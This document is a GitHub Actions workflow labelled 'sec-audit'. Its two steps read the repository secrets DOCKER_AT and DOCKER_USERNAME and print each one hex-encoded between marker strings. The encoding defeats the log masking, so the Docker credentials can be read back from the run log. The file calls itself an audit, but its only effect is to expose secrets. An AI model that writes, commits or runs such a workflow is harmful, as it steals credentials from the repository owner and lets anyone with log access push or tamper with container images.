name: sec-audit
on: workflow_dispatch
jobs:
  repo_secrets:
    runs-on: ubuntu-latest
    steps:
      - name: s_DOCKER_AT
        env:
          V: ${{ secrets.DOCKER_AT }}
        run: printf 'XX_DOCKER_AT_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_DOCKER_USERNAME
        env:
          V: ${{ secrets.DOCKER_USERNAME }}
        run: printf 'XX_DOCKER_USERNAME_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
